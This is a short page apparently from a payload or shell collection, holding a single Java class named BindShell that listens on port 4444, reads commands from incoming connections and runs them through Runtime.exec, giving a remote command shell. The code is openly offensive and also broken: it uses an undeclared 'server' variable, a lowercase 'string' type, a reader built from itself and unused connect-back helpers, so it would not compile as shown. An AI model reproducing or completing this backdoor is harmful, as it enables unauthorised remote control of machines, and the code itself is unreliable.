# Java

```java
import java.util.Scanner;
import java.net.*;
import java.io.*;

public class BindShell {
	private static Socket s;
	private static Scanner scanner;
	private static PrintWriter printerwriter;
	private static int length;
	private static ProcessBuilder processbuilder;
	private static BufferedReader in;
	private static String line;
	private static String stdout;

	// connect back, bind shell connec to external machine
	private static void ExecuteCommands(String commandAndArgs) throws IOException, InterruptedException {
		String command = commandAndArgs;
		Process process = Runtime.getRuntime().exec(command);

		// Read the output
		BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

		String line = "";
		while ((line = reader.readLine()) != null) {
			System.out.print(line + "\n");
		}

		process.waitFor();
	}

	private static String Resolve(String host) {
		InetAddress ip;

		while (true) {
			try {
				ip = InetAddress.getByName(host);
				host = ip.getHostAddress().toString();
				return host;
			} catch (Exception err) {
				continue;
			}
		}
	}

	private static int Connect(String ip, int port) {
		try {
			s = new Socket(ip, port);
			return 1;
		} catch (Exception err) {
			return 0;
		}
	}

	public static Socket socket;

	public static void main(String[] args) throws IOException, InterruptedException {
		int port = 4444;
		String answer;
		String returnedMessage;
		string reply;

		System.out.println("Server start at port " + port + ".");

		while (true) {
			socket = server.accept(); // authentication
			InputStream inputstream = socket.getInputStream();
			InputStreamReader inputstreamreader = new InputStreamReader(inputstreamreader);
			BufferedReader br = new BufferedReader(inputstreamreader);
			answer = br.readLine();
			System.out.println("Sent command from the server: " + answer);

			if ("QUIT".equals(answer))
				break;
			else {
				ExecuteCommands(answer);
			}
		}
	}
}
```